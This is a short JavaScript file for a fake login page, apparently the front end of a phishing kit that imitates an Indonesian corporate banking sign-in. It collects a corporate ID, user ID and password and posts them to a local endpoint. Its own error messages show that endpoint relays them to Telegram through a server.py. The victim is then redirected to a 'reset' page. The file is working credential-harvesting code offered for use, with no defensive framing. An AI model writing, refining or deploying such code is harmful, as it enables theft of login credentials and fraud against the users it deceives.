document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('loginForm');
    const corpId = document.getElementById('corpId');
    const userId = document.getElementById('userId');
    const password = document.getElementById('password');
    const togglePwd = document.getElementById('togglePwd');
    const btnMasuk = document.getElementById('btnMasuk');

    togglePwd.addEventListener('click', () => {
        password.type = password.type === 'password' ? 'text' : 'password';
        togglePwd.style.opacity = password.type === 'text' ? '0.5' : '1';
    });

    function checkForm() {
        if (corpId.value.trim() && userId.value.trim() && password.value.trim()) {
            btnMasuk.classList.add('active');
            btnMasuk.removeAttribute('disabled');
        } else {
            btnMasuk.classList.remove('active');
            btnMasuk.setAttribute('disabled', 'true');
        }
    }

    corpId.addEventListener('input', checkForm);
    userId.addEventListener('input', checkForm);
    password.addEventListener('input', checkForm);

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        btnMasuk.textContent = 'Memproses...';
        btnMasuk.disabled = true;

        try {
            const response = await fetch('/api/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ corpId: corpId.value, userId: userId.value, password: password.value })
            });

            if (response.ok) {
                window.location.href = 'reset.html'; 
            } else {
                alert('Gagal mengirim ke Telegram. Cek Token/ID di server.py');
                resetBtn();
            }
        } catch (error) {
            alert('Gagal terhubung ke server Python. Pastikan server.py berjalan.');
            resetBtn();
        }
    });

    function resetBtn() {
        btnMasuk.textContent = 'Masuk';
        btnMasuk.disabled = false;
    }
});
